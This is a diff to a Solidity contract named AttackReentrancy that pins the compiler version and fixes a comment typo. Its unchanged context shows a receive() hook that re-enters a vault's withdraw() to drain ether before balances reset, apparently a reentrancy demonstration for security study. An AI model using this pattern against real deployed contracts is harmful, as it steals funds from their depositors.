@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity 0.8.20;
 
 interface IVault {
     function deposit() external payable;
@@ -18,7 +18,7 @@ contract AttackReentrancy {
     // called automatically every time this contract receives ETH
     receive() external payable {
         if (address(vault).balance >= 1 ether) {
-            vault.withdraw(); // re-enter before balanaces[attacker] = 0
+            vault.withdraw(); // re-enter before balances[attacker] = 0
         }
     }
 
